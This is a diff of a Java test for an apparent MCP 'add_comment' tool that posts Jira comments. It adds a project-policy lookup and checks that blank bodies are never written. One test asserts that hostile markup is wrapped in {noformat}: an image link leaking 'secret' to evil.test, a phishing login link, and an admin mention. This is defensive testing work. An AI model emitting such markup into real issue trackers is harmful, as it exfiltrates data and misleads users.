@@ -28,7 +28,7 @@ class AddCommentToolTest extends ServerTestSupport {
             assertThat(text(result)).doesNotContain("jkowalski@corp.test", "(echo)");
         }
         assertThat(BACKEND.requests()).extracting(StubBackend.Request::path)
-                .containsExactly("/rest/api/2/issue/ABC-1", "/rest/api/2/issue/ABC-1/comment");
+                .containsExactly("/rest/api/2/issue/ABC-1", "/rest/api/2/project/ABC", "/rest/api/2/issue/ABC-1/comment");
         assertThat(BACKEND.requests().getLast()).satisfies(request -> {
             assertThat(request.method()).isEqualTo("POST");
             assertThat(request.path()).isEqualTo("/rest/api/2/issue/ABC-1/comment");
@@ -76,14 +76,15 @@ class AddCommentToolTest extends ServerTestSupport {
         try (McpSyncClient client = clientWithCredential(PAT)) {
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "abc-1", "body", "x")),
                     "issueKey does not match the required format");
-            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "   ")),
-                    "body must be");
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "a\u0000b")),
                     "body contains control characters");
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x".repeat(10_001))),
                     "body is longer than 10000 characters");
+            assertThat(BACKEND.requests()).isEmpty();
+            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "   ")),
+                    "body must be");
         }
-        assertThat(BACKEND.requests()).isEmpty();
+        assertThat(BACKEND.writes()).as("the issue is read for the policy, a blank body is not written").isEmpty();
     }
 
     @Test
@@ -93,7 +94,7 @@ class AddCommentToolTest extends ServerTestSupport {
         try (McpSyncClient client = clientWithCredential(PAT)) {
             assertThat(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", body)).isError()).isFalse();
         }
-        String sent = JSON.readTree(BACKEND.requests().get(1).body()).at("/body").asString();
+        String sent = JSON.readTree(BACKEND.writes().getFirst().body()).at("/body").asString();
         assertThat(sent).startsWith("{noformat}\n").endsWith("\n{noformat}");
         String inside = sent.substring("{noformat}\n".length(), sent.length() - "\n{noformat}".length());
         assertThat(inside).contains("!https://evil.test/p.png?d=secret!", "[click|https://evil.test/login]", "[~admin]");
@@ -111,6 +112,7 @@ class AddCommentToolTest extends ServerTestSupport {
         }
         assertThat(BACKEND.requests()).extracting(StubBackend.Request::method, StubBackend.Request::path)
                 .containsExactly(org.assertj.core.groups.Tuple.tuple("GET", "/rest/api/2/issue/ABC-3"),
+                        org.assertj.core.groups.Tuple.tuple("GET", "/rest/api/2/project/DEF"),
                         org.assertj.core.groups.Tuple.tuple("POST", "/rest/api/2/issue/DEF-5/comment"));
     }
 
